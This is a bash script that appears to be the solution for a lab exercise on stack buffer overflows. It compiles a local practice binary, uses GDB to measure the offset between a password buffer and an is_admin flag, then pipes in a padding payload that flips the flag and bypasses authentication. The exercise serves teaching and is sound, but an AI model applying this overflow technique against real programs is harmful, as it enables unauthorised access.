#!/usr/bin/env bash
#
# Interactive solution for exercise 1.  This script compiles the target,
# uses GDB to inspect the stack layout, computes the offset between
# `password` and `is_admin`, and crafts a payload that flips the admin flag.
# The user is prompted at each stage so that they can observe the output.

set -euo pipefail

# Determine the directory of this script and change into the lab directory
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

echo "=== Exercise 1: Bypass authentication ==="
echo "We will overflow the 8‑byte password buffer to set the is_admin flag"
echo "without knowing the secret password.  GDB will tell us how far apart"
echo "the variables lie on the stack."

cd "$DIR/../lab2"

read -rp "Press ENTER to build ex1..."
make ex1

read -rp "Press ENTER to launch gdb and inspect the stack layout..."

# Capture GDB output in a temporary file for parsing
TMP=$(mktemp)

gdb -q \
  -ex "file ./bin/ex1" \
  -ex "break main" \
  -ex "run" \
  -ex "frame 0" \
  -ex "# step over prologue so rbp is set" \
  -ex "nexti 2" \
  -ex "printf \"&password = %p\\n\", &password" \
  -ex "printf \"&is_admin = %p\\n\", &is_admin" \
  -ex "quit" \
  2>&1 | tee "$TMP"

# Extract addresses from the GDB output
pwd_hex=$(grep "&password" "$TMP" | awk '{print $3}')
adm_hex=$(grep "&is_admin" "$TMP" | awk '{print $3}')

if [[ -z "$pwd_hex" || -z "$adm_hex" ]]; then
  echo "[!] Failed to parse addresses from GDB output"
  exit 1
fi

off_is_admin=$(python3 -c "buf=int('$pwd_hex',0); adm=int('$adm_hex',0); print(adm-buf)")

echo "[INFO] &password = $pwd_hex"
echo "[INFO] &is_admin = $adm_hex"
echo "Calculated offset between password and is_admin: $off_is_admin bytes"

echo "We will now craft a payload consisting of $off_is_admin padding bytes"
echo "followed by 0x01 to set is_admin to a non‑zero value."
read -rp "Press ENTER to run the exploit..."

# Use Python to generate the payload and pipe it into the program.  The
# use of python -c avoids embedding a here‑document in this script.
python3 -c "import sys; sys.stdout.buffer.write(b'A'*$off_is_admin + b'\x01')" | ./bin/ex1

echo "If you see 'Access granted!', the overflow succeeded."